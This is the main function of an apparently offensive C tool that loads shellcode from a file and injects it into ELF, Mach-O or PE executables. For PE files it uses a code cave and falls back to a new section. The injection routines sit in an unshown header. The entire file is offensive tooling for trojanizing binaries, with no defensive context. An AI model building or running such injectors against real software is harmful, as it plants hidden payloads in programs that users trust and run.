#include <stdio.h>
#include "shinject.h"
int main (int argc , char *argv[]){


    if(argc<3){
        printf("not all arguments provided ");
        return -1;

    }
    int ret;
    uint32_t shellcode_len;
char *shellcode = load_file(argv[2],&shellcode_len);
    int type = file_type(argv[1]);
    if(type == ELF){
        ret = ELF_inject(argv[1],shellcode,shellcode_len);
    }
    if(type == MACH_O){
        ret = MACH_O_inject(argv[1],shellcode,shellcode_len);
    }
    if(type == PE){
        ret = PE_code_cave(argv[1],shellcode,shellcode_len);
        if (ret==-1){
            printf("couldn't find code cave");
            ret = PE_new_section(argv[1],"abc",shellcode,shellcode_len);
        }
    }
   if(ret==0){
    printf("success");
   }
   else{
    printf("error");
   }
   return ret;
}